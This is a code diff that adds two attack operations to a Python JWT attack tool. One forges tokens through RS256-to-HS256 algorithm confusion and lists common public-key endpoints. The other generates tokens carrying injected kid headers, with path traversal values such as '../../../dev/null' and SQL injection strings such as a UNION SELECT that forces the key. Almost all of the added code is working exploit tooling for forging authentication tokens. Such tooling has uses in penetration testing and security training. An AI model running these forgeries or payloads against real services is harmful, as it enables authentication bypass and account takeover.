@@ -108,6 +108,8 @@ class JwtTool:
         "crack",
         "forge_with_key",
         "analyze",
+        "confusion_rs256_hs256",
+        "kid_inject",
     }
 
     def use(self, tool_input: str) -> str:
@@ -145,6 +147,10 @@ class JwtTool:
                 return self._forge_with_key(claims, key, data.get("algorithm", "HS256"))
             elif operation == "analyze":
                 return self._analyze(token)
+            elif operation == "confusion_rs256_hs256":
+                return self._confusion_rs256_hs256(token, key, claims)
+            elif operation == "kid_inject":
+                return self._kid_inject(token, claims, key, data.get("kid_value", ""))
             else:
                 return f"[JwtTool] Error: Operation '{operation}' not implemented."
         except Exception as exc:
@@ -578,7 +584,177 @@ class JwtTool:
         result += "\n=== Recommended Next Steps ===\n"
         if alg.upper() in ["HS256", "HS384", "HS512"]:
             result += "1. Try 'crack' operation to find weak secret\n"
-        result += "2. Try 'forge_none' operation to bypass signature\n"
-        result += "3. Try 'modify_claim' to change privilege claims\n"
+        if alg.upper() in ["RS256", "RS384", "RS512"]:
+            result += "1. Try 'confusion_rs256_hs256' to exploit algorithm confusion\n"
+        if "kid" in header:
+            result += "2. Try 'kid_inject' to exploit kid header injection\n"
+        result += "3. Try 'forge_none' operation to bypass signature\n"
+        result += "4. Try 'modify_claim' to change privilege claims\n"
+
+        return result
+
+    def _confusion_rs256_hs256(
+        self, token: str, public_key: str, claims: Dict[str, Any]
+    ) -> str:
+        """
+        RS256 -> HS256 algorithm confusion attack.
+
+        If the server uses RS256 (asymmetric), it verifies with the public key.
+        By switching to HS256 (symmetric), the server may use the public key as
+        the HMAC secret, allowing us to forge tokens with the known public key.
+
+        Args:
+            token: The original JWT (to extract payload if no claims provided)
+            public_key: The server's public key (PEM format)
+            claims: Optional claims to set in the forged token
+        """
+        result = "[JwtTool] RS256→HS256 Algorithm Confusion Attack\n"
+        result += "=" * 50 + "\n\n"
+
+        if not token and not claims:
+            return "[JwtTool] Error: 'token' or 'claims' required for confusion attack."
+
+        if not public_key:
+            result += "[!] No public key provided. To use this attack:\n"
+            result += "  1. Find the server's public key (often at /.well-known/jwks.json, /api/public-key, etc.)\n"
+            result += "  2. Provide it as the 'key' parameter in PEM format\n"
+            result += "  3. Re-run with 'key' set to the public key content\n\n"
+            result += "=== Common public key locations ===\n"
+            result += "  - /.well-known/jwks.json\n"
+            result += "  - /api/v1/public-key\n"
+            result += "  - /oauth/jwks\n"
+            result += "  - /api/auth/public-key\n"
+            result += "  - Check page source or JavaScript for embedded keys\n"
+            return result
+
+        # Get payload from token or use provided claims
+        if token:
+            _, payload, _ = self._parse_jwt(token)
+            if payload is None:
+                payload = {}
+        else:
+            payload = {}
+
+        if claims:
+            payload.update(claims)
+
+        # Create HS256 header (the attack: switch from RS256 to HS256)
+        header = {"alg": "HS256", "typ": "JWT"}
+
+        header_b64 = self._b64_url_encode(
+            json.dumps(header, separators=(",", ":")).encode()
+        )
+        payload_b64 = self._b64_url_encode(
+            json.dumps(payload, separators=(",", ":")).encode()
+        )
+
+        # Sign with the public key as HMAC secret
+        try:
+            signature = self._sign(header_b64, payload_b64, public_key, "HS256")
+            forged = f"{header_b64}.{payload_b64}.{signature}"
+
+            result += "[*] Attack: Changed algorithm from RS256 to HS256\n"
+            result += "[*] Signed with the public key as HMAC secret\n\n"
+            result += f"Payload: {json.dumps(payload, indent=2)}\n\n"
+            result += f"Forged token:\n{forged}\n\n"
+            result += "=== How it works ===\n"
+            result += "1. Server expects RS256 (asymmetric): verify with PUBLIC key\n"
+            result += "2. We changed alg to HS256 (symmetric): verify with SECRET key\n"
+            result += "3. If server uses same key for both, it will use the PUBLIC key\n"
+            result += "   as the HMAC secret — which we know!\n"
+        except Exception as e:
+            result += f"[!] Error creating forged token: {e}\n"
+            result += "Make sure 'key' contains the PEM public key content.\n"
+
+        return result
+
+    def _kid_inject(
+        self, token: str, claims: Dict[str, Any], key: str, kid_value: str
+    ) -> str:
+        """
+        Exploit 'kid' (Key ID) header injection.
+
+        The kid header can be vulnerable to:
+        - SQL injection: kid becomes part of a SQL query
+        - Path traversal: kid is used to load a key file
+        - Command injection: kid is used in a shell command
+        """
+        result = "[JwtTool] kid Header Injection Attack\n"
+        result += "=" * 50 + "\n\n"
+
+        if not token and not claims:
+            return "[JwtTool] Error: 'token' or 'claims' required for kid_inject."
+
+        # Get payload from token or use provided claims
+        if token:
+            header, payload, _ = self._parse_jwt(token)
+            if header is None:
+                header = {"alg": "HS256", "typ": "JWT"}
+            if payload is None:
+                payload = {}
+        else:
+            header = {"alg": "HS256", "typ": "JWT"}
+            payload = {}
+
+        if claims:
+            payload.update(claims)
+
+        # Generate attack variants
+        attacks = []
+
+        # Path traversal attacks (key loaded from file)
+        path_traversal_kids = [
+            ("../../../dev/null", "", "Sign with empty key (dev/null)"),
+            ("../../../proc/sys/kernel/hostname", "", "Sign with hostname as key"),
+            ("../../../../../../dev/null", "", "Deep traversal to dev/null"),
+        ]
+        for kid, sign_key, desc in path_traversal_kids:
+            attacks.append(("path_traversal", kid, sign_key, desc))
+
+        # SQL injection attacks (kid used in SQL query)
+        sqli_kids = [
+            ("' UNION SELECT 'secret' --", "secret", "SQLi: force key = 'secret'"),
+            ("' UNION SELECT '' --", "", "SQLi: force empty key"),
+            ("' OR '1'='1", key or "secret", "SQLi: bypass key lookup"),
+        ]
+        for kid, sign_key, desc in sqli_kids:
+            attacks.append(("sqli", kid, sign_key, desc))
+
+        # Custom kid value if provided
+        if kid_value:
+            attacks.insert(0, ("custom", kid_value, key or "", f"Custom kid: {kid_value}"))
+
+        result += f"Original payload: {json.dumps(payload, indent=2)}\n\n"
+        result += "=== Generated Attack Tokens ===\n\n"
+
+        for attack_type, kid, sign_key, desc in attacks:
+            attack_header = dict(header)
+            attack_header["kid"] = kid
+            attack_header["alg"] = "HS256"
+
+            header_b64 = self._b64_url_encode(
+                json.dumps(attack_header, separators=(",", ":")).encode()
+            )
+            payload_b64 = self._b64_url_encode(
+                json.dumps(payload, separators=(",", ":")).encode()
+            )
+
+            try:
+                signature = self._sign(header_b64, payload_b64, sign_key, "HS256")
+                forged = f"{header_b64}.{payload_b64}.{signature}"
+
+                result += f"--- {attack_type}: {desc} ---\n"
+                result += f"kid: {kid}\n"
+                result += f"signing key: {sign_key!r}\n"
+                result += f"Token: {forged}\n\n"
+            except Exception as e:
+                result += f"--- {attack_type}: {desc} ---\n"
+                result += f"[Error: {e}]\n\n"
+
+        result += "=== Tips ===\n"
+        result += "1. Path traversal: Works when server loads key from file using kid\n"
+        result += "2. SQL injection: Works when kid is used in a SQL query\n"
+        result += "3. /dev/null is empty → sign with empty string as key\n"
+        result += "4. Try both HS256 and original algorithm\n"
 
         return result
